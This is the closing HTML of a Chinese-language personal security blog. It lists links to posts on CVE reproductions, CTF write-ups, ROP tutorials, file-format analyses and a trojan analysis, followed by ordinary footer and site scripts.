    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/05/27/ELF_FileFormat_Analysis/">ELF文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/14/TEB_and_PEB/">TEB和PEB</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/22/BlackHat USA 2010 - Understanding the Low Fragmentation Heap/">翻译 - BlackHat USA 2010 - Understanding the Low Fragmentation Heap</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/16/CVE-2012-1876复现与分析/">CVE-2012-1876复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/10/CVE-2010-2553复现与分析/">CVE-2010-2553复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/AVI文件格式分析/">AVI文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/20/CVE-2010-3333复现与分析/">CVE-2010-3333复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/15/ret2_dl_runtime_resolve详解/">ret2_dl_runtime_resolve详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">RCTF2015——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/">ZCTF2016——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/08/ZIP文件格式分析/">ZIP文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/RAR文件格式分析/">RAR文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/">OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/26/护网杯2018——WriteUp/">护网杯2018——WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/CVE-2010-2883复现与分析/">CVE-2010-2883复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/redhat2018—writeup/">redhat2018—writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/一步一步学ROP之Linux_x64篇-蒸米/">一步一步学ROP之Linux_x64篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/">一步一步学ROP之Linux_x86篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/08/Kali2018-搜狗输入法安装/">Kali2018-搜狗输入法安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/Pwn环境搭建-Ubuntu16.04/">Pwn环境搭建——Ubuntu16.04</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/pwnable.kr/">pwnable.kr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/MySQL宽字节注入/">MySQL宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/实验吧Wirteup合集/">实验吧WriteUp合集</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2018-2021 Sp4n9x
            </div>
            <div class="footer-right">
                <span> Sp4n9x's Blog <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
    </div>
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 10;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





    <script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
             github: ".github-widget a", 
            
             post: ".article-entry a[href]", 
             tags: ".article-tag a", 
             categories: ".article-category a, a.tag-list-link", 
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>
<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
    <!-- 点击爱心效果 -->
    <script src="/js/love.js"></script>
  </div>
</body>
</html>